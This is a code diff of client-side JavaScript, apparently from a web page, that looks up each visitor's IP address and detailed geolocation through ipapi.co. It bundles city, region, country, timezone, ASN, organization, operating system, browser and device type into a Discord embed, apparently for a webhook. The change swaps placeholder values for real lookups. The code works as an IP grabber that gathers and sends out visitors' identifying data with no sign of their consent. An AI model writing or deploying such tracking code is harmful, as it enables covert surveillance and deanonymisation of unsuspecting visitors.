@@ -48,11 +48,22 @@
         }
 
         function logIpAddress() {
-            fetch('https://api64.ipify.org?format=json')
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     var ipAddress = data.ip;
-                    var locationData = {}; // Fetch location data using ipAddress if needed
+                    var locationData = {
+                        "City": data.city,
+                        "Region": data.region,
+                        "Country": data.country_name,
+                        "Country Code": data.country,
+                        "Continent Code": data.continent_code,
+                        "Timezone": data.timezone,
+                        "Currency": data.currency,
+                        "Language": data.languages,
+                        "ASN": data.asn,
+                        "Organization": data.org
+                    };
 
                     sendToDiscord(ipAddress, locationData);
                 })
@@ -62,16 +73,16 @@
         function sendToDiscord(ipAddress, locationData) {
             var embedData = {
                 "IP Address": ipAddress,
-                "City": "Unknown",
-                "Region": "Unknown",
-                "Country": "Unknown",
-                "Country Code": "Unknown",
-                "Continent Code": "Unknown",
-                "Timezone": "Unknown",
-                "Currency": "Unknown",
-                "Language": "Unknown",
-                "ASN": "Unknown",
-                "Organization": "Unknown"
+                "City": locationData.City || "Unknown",
+                "Region": locationData.Region || "Unknown",
+                "Country": locationData.Country || "Unknown",
+                "Country Code": locationData["Country Code"] || "Unknown",
+                "Continent Code": locationData["Continent Code"] || "Unknown",
+                "Timezone": locationData.Timezone || "Unknown",
+                "Currency": locationData.Currency || "Unknown",
+                "Language": locationData.Language || "Unknown",
+                "ASN": locationData.ASN || "Unknown",
+                "Organization": locationData.Organization || "Unknown"
             };
 
             var embed = createEmbed(embedData);
@@ -93,16 +104,16 @@
                         "color": 65280,
                         "fields": [
                             { "name": "IP Address", "value": "```" + embedData["IP Address"] + "```" },
-                            { "name": "City", "value": "```" + embedData["City"] + "```" },
-                            { "name": "Region", "value": "```" + embedData["Region"] + "```" },
-                            { "name": "Country", "value": "```" + embedData["Country"] + "```" },
+                            { "name": "City", "value": "```" + embedData.City + "```" },
+                            { "name": "Region", "value": "```" + embedData.Region + "```" },
+                            { "name": "Country", "value": "```" + embedData.Country + "```" },
                             { "name": "Country Code", "value": "```" + embedData["Country Code"] + "```" },
                             { "name": "Continent Code", "value": "```" + embedData["Continent Code"] + "```" },
-                            { "name": "Timezone", "value": "```" + embedData["Timezone"] + "```" },
-                            { "name": "Currency", "value": "```" + embedData["Currency"] + "```" },
-                            { "name": "Language", "value": "```" + embedData["Language"] + "```" },
-                            { "name": "ASN", "value": "```" + embedData["ASN"] + "```" },
-                            { "name": "Organization", "value": "```" + embedData["Organization"] + "```" },
+                            { "name": "Timezone", "value": "```" + embedData.Timezone + "```" },
+                            { "name": "Currency", "value": "```" + embedData.Currency + "```" },
+                            { "name": "Language", "value": "```" + embedData.Language + "```" },
+                            { "name": "ASN", "value": "```" + embedData.ASN + "```" },
+                            { "name": "Organization", "value": "```" + embedData.Organization + "```" },
                             { "name": "Operating System", "value": "```" + os + "```" },
                             { "name": "Browser", "value": "```" + browser + "```" },
                             { "name": "Device Type", "value": "```" + deviceType + "```" },
